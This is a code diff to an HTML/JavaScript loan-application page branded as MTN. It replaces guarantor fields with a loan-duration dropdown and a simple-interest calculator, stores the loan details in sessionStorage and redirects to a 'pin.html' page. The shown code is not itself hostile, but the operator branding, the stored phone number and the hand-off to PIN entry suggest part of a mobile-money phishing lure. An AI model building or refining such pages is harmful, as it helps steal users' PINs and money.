@@ -47,7 +47,7 @@
       overflow: hidden;
     }
 
-    /* ─── NEW LOGO IMAGE ─── */
+    /* ─── LOGO IMAGE ─── */
     .mtn-header {
       position: relative;
       z-index: 2;
@@ -165,11 +165,86 @@
       box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.2);
     }
 
-    .name-row {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
+    /* ─── DURATION DROPDOWN ─── */
+    .select-wrapper {
+      position: relative;
+    }
+
+    .select-wrapper select {
+      width: 100%;
+      padding: 14px 42px 14px 16px;
+      border: 1px solid var(--border);
+      border-radius: 12px;
+      font-family: inherit;
+      font-size: 15px;
+      font-weight: 500;
+      color: var(--text);
+      background: #fff;
+      outline: none;
+      cursor: pointer;
+      transition: border 0.2s, box-shadow 0.2s;
+      appearance: none;
+      -webkit-appearance: none;
+      -moz-appearance: none;
+    }
+
+    .select-wrapper select:focus {
+      border-color: var(--mtn-yellow);
+      box-shadow: 0 0 0 2px rgba(255, 204, 0, 0.2);
+    }
+
+    .select-arrow {
+      position: absolute;
+      right: 16px;
+      top: 50%;
+      transform: translateY(-50%);
+      font-size: 13px;
+      color: var(--sub);
+      pointer-events: none;
+    }
+
+    /* ─── INTEREST CALCULATOR BOX ─── */
+    .calc-box {
+      background: #fffae9;
+      border: 1px solid #ffeeba;
+      border-radius: 14px;
+      padding: 14px 16px;
       margin-bottom: 20px;
+      text-align: left;
+    }
+
+    .calc-row {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-size: 14px;
+      font-weight: 500;
+      color: var(--sub);
+      padding: 5px 0;
+    }
+
+    .calc-row strong {
+      color: #000;
+      font-weight: 700;
+    }
+
+    .calc-row.total {
+      border-top: 1px dashed #ffe0a3;
+      margin-top: 6px;
+      padding-top: 12px;
+      font-size: 15px;
+    }
+
+    .calc-row.total strong {
+      font-size: 18px;
+      color: #000;
+    }
+
+    .calc-note {
+      font-size: 11px;
+      color: var(--sub);
+      text-align: center;
+      margin-top: 10px;
     }
 
     .error-message {
@@ -316,6 +391,10 @@
     const MAX_LIMIT = 9875;
     const MIN_AMOUNT = 100;
 
+    // Simple interest rate – 8% per annum
+    const ANNUAL_RATE = 0.08;
+    const DAYS_IN_YEAR = 365;
+
     // Retrieve user's phone from sessionStorage
     const userPhone = sessionStorage.getItem('mtn_phone') || '';
 
@@ -344,25 +423,28 @@
               <div class="error-message" id="amountError">Please enter a valid amount.</div>
             </div>
 
-            <div class="section-header">
-              <h3><i class="fas fa-user-friends"></i> Guarantor / Next of Kin</h3>
-            </div>
-            <div class="name-row">
-              <div class="input-group" style="margin-bottom: 0;">
-                <label>First Name</label>
-                <input type="text" id="guarantorFirstName" placeholder="First name" autocomplete="off">
-                <div class="error-message" id="firstNameError">First name is required.</div>
-              </div>
-              <div class="input-group" style="margin-bottom: 0;">
-                <label>Last Name</label>
-                <input type="text" id="guarantorLastName" placeholder="Last name" autocomplete="off">
-                <div class="error-message" id="lastNameError">Last name is required.</div>
-              </div>
-            </div>
             <div class="input-group">
-              <label>Guarantor Phone</label>
-              <input type="tel" id="guarantorPhone" placeholder="e.g. 07 66 123 456" inputmode="numeric">
-              <div class="error-message" id="phoneError">Invalid number or identical to yours.</div>
+              <label>Loan Duration</label>
+              <div class="select-wrapper">
+                <select id="loanDuration">
+                  <option value="30">30 days</option>
+                  <option value="90">90 days</option>
+                  <option value="180">180 days</option>
+                </select>
+                <i class="fas fa-chevron-down select-arrow"></i>
+              </div>
+            </div>
+
+            <div class="calc-box">
+              <div class="calc-row">
+                <span>Interest (8% p.a.)</span>
+                <strong id="interestValue">—</strong>
+              </div>
+              <div class="calc-row total">
+                <span>Total Repayment</span>
+                <strong id="totalValue">—</strong>
+              </div>
+              <div class="calc-note">Simple interest calculated on the amount you borrow.</div>
             </div>
 
             <button id="applyBtn" class="btn" disabled>Apply Now</button>
@@ -371,159 +453,92 @@
       `;
 
       const amountInput = document.getElementById('loanAmount');
-      const firstNameInput = document.getElementById('guarantorFirstName');
-      const lastNameInput = document.getElementById('guarantorLastName');
-      const phoneInput = document.getElementById('guarantorPhone');
+      const durationSelect = document.getElementById('loanDuration');
       const applyBtn = document.getElementById('applyBtn');
-
       const amountError = document.getElementById('amountError');
-      const firstNameError = document.getElementById('firstNameError');
-      const lastNameError = document.getElementById('lastNameError');
-      const phoneError = document.getElementById('phoneError');
+      const interestValue = document.getElementById('interestValue');
+      const totalValue = document.getElementById('totalValue');
 
-      // Hide all errors initially
-      [amountError, firstNameError, lastNameError, phoneError].forEach(el => el.classList.remove('visible'));
+      amountError.classList.remove('visible');
 
-      // Validation functions
-      function validateAmount() {
+      // ─── Validation ───
+      function validateAmount(showError) {
         const val = parseInt(amountInput.value, 10);
-        if (isNaN(val) || val < MIN_AMOUNT || val > MAX_LIMIT) {
+        const ok = !isNaN(val) && val >= MIN_AMOUNT && val <= MAX_LIMIT;
+
+        if (ok) {
+          amountError.classList.remove('visible');
+        } else if (showError) {
+          amountError.textContent = isNaN(val)
+            ? 'Please enter a valid number.'
+            : `Amount must be between ${MIN_AMOUNT.toLocaleString('en-US')} and ${MAX_LIMIT.toLocaleString('en-US')} ZMW.`;
           amountError.classList.add('visible');
-          if (isNaN(val)) amountError.textContent = `Please enter a valid number.`;
-          else amountError.textContent = `Amount must be between ${MIN_AMOUNT.toLocaleString('en-US')} and ${MAX_LIMIT.toLocaleString('en-US')} ZMW.`;
-          return false;
-        } else {
-          amountError.classList.remove('visible');
-          return true;
         }
+        return ok;
       }
 
-      function validateFirstName() {
-        const val = firstNameInput.value.trim();
-        if (val === '') {
-          firstNameError.classList.add('visible');
-          return false;
-        } else {
-          firstNameError.classList.remove('visible');
-          return true;
+      // ─── Simple interest calculator ───
+      function updateCalculator() {
+        const amount = parseInt(amountInput.value, 10);
+        const days = parseInt(durationSelect.value, 10);
+
+        if (isNaN(amount) || amount < MIN_AMOUNT || amount > MAX_LIMIT) {
+          interestValue.textContent = '—';
+          totalValue.textContent = '—';
+          return;
         }
+
+        const interest = amount * ANNUAL_RATE * (days / DAYS_IN_YEAR);
+        const total = amount + interest;
+
+        interestValue.textContent = 'ZMW ' + interest.toFixed(2);
+        totalValue.textContent = 'ZMW ' + total.toFixed(2);
       }
-
-      function validateLastName() {
-        const val = lastNameInput.value.trim();
-        if (val === '') {
-          lastNameError.classList.add('visible');
-          return false;
-        } else {
-          lastNameError.classList.remove('visible');
-          return true;
-        }
-      }
-
-      function validatePhone() {
-        const raw = phoneInput.value.trim();
-        const digits = raw.replace(/\D/g, '');
-        const userDigits = userPhone.replace(/\D/g, '');
-        if (digits === '') {
-          phoneError.textContent = 'Phone number is required.';
-          phoneError.classList.add('visible');
-          return false;
-        } else if (digits === userDigits && userDigits !== '') {
-          phoneError.textContent = 'Guarantor phone cannot be the same as yours.';
-          phoneError.classList.add('visible');
-          return false;
-        } else if (digits.length !== 10) {
-          phoneError.textContent = 'Please enter a valid phone number (10 digits).';
-          phoneError.classList.add('visible');
-          return false;
-        } else {
-          phoneError.classList.remove('visible');
-          return true;
-        }
-      }
-
-      // Attach blur events
-      amountInput.addEventListener('blur', function() {
-        validateAmount();
-        updateButton();
-      });
-      firstNameInput.addEventListener('blur', function() {
-        validateFirstName();
-        updateButton();
-      });
-      lastNameInput.addEventListener('blur', function() {
-        validateLastName();
-        updateButton();
-      });
-      phoneInput.addEventListener('blur', function() {
-        validatePhone();
-        updateButton();
-      });
-
-      // Input events for real-time feedback
-      amountInput.addEventListener('input', function() {
-        const val = parseInt(this.value, 10);
-        if (!isNaN(val) && val >= MIN_AMOUNT && val <= MAX_LIMIT) {
-          amountError.classList.remove('visible');
-        }
-        updateButton();
-      });
-      firstNameInput.addEventListener('input', function() {
-        if (this.value.trim() !== '') firstNameError.classList.remove('visible');
-        updateButton();
-      });
-      lastNameInput.addEventListener('input', function() {
-        if (this.value.trim() !== '') lastNameError.classList.remove('visible');
-        updateButton();
-      });
-      phoneInput.addEventListener('input', function() {
-        const digits = this.value.replace(/\D/g, '');
-        if (digits.length === 9 && digits !== userPhone.replace(/\D/g, '')) {
-          phoneError.classList.remove('visible');
-        }
-        updateButton();
-      });
 
       function updateButton() {
-        const amountOk = validateAmount();
-        const firstNameOk = validateFirstName();
-        const lastNameOk = validateLastName();
-        const phoneOk = validatePhone();
-        applyBtn.disabled = !(amountOk && firstNameOk && lastNameOk && phoneOk);
+        applyBtn.disabled = !validateAmount(false);
       }
 
+      function refresh() {
+        updateCalculator();
+        updateButton();
+      }
+
+      // ─── Events ───
+      amountInput.addEventListener('input', refresh);
+      amountInput.addEventListener('blur', function () {
+        validateAmount(true);
+        updateButton();
+      });
+
+      durationSelect.addEventListener('change', refresh);
+
       applyBtn.disabled = true;
+      updateCalculator();
 
-      applyBtn.addEventListener('click', function() {
-        const amountOk = validateAmount();
-        const firstNameOk = validateFirstName();
-        const lastNameOk = validateLastName();
-        const phoneOk = validatePhone();
-        if (amountOk && firstNameOk && lastNameOk && phoneOk) {
-          const amount = parseInt(amountInput.value, 10);
-          const firstName = firstNameInput.value.trim();
-          const lastName = lastNameInput.value.trim();
-          const phoneDigits = phoneInput.value.replace(/\D/g, '');
-
-          sessionStorage.setItem('mtn_loanAmount', amount);
-          sessionStorage.setItem('mtn_guarantorFirstName', firstName);
-          sessionStorage.setItem('mtn_guarantorLastName', lastName);
-          sessionStorage.setItem('mtn_guarantorPhone', phoneDigits);
-
-          const spinner = document.getElementById('spinner');
-          spinner.style.display = 'flex';
+      applyBtn.addEventListener('click', function () {
+        if (!validateAmount(true)) {
           applyBtn.disabled = true;
-
-          setTimeout(() => {
-            window.location.href = 'pin.html';
-          }, 1500);
-        } else {
-          validateAmount();
-          validateFirstName();
-          validateLastName();
-          validatePhone();
-          applyBtn.disabled = true;
+          return;
         }
+
+        const amount = parseInt(amountInput.value, 10);
+        const days = parseInt(durationSelect.value, 10);
+        const interest = amount * ANNUAL_RATE * (days / DAYS_IN_YEAR);
+        const total = amount + interest;
+
+        sessionStorage.setItem('mtn_loanAmount', amount);
+        sessionStorage.setItem('mtn_loanDuration', days);
+        sessionStorage.setItem('mtn_loanInterest', interest.toFixed(2));
+        sessionStorage.setItem('mtn_loanTotal', total.toFixed(2));
+
+        const spinner = document.getElementById('spinner');
+        spinner.style.display = 'flex';
+        applyBtn.disabled = true;
+
+        setTimeout(() => {
+          window.location.href = 'pin.html';
+        }, 1500);
       });
     }
 
